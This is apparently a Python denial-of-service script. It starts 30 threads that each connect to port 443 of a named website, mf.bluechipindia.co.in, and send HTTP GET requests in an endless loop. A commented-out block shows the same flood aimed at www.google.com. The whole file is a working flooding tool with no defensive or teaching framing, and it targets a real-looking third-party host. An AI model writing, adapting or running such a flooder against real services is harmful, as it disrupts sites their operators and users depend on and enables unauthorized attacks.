import socket
import threading

def send_data():
    target_host = "mf.bluechipindia.co.in"
    target_port = 443  # HTTPS port
    message = b"GET / HTTP/1.1\r\nHost: mf.bluechipindia.co.in\r\n\r\n"  # HTTP GET request

    # target_host = "www.google.com"
    # target_port = 80  # HTTP port
    # message = b"GET / HTTP/1.1\r\nHost: www.google.com\r\n\r\n"  # HTTP GET request

    # Create a TCP socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the target host
        client.connect((target_host, target_port))

        # Send data continuously
        while True:
            client.sendall(message)

    except Exception as e:
        print(f"Exception: {e}")

def main(num_connections=30):
    # Create multiple threads for sending data
    threads = []
    for _ in range(num_connections):
        thread = threading.Thread(target=send_data)
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
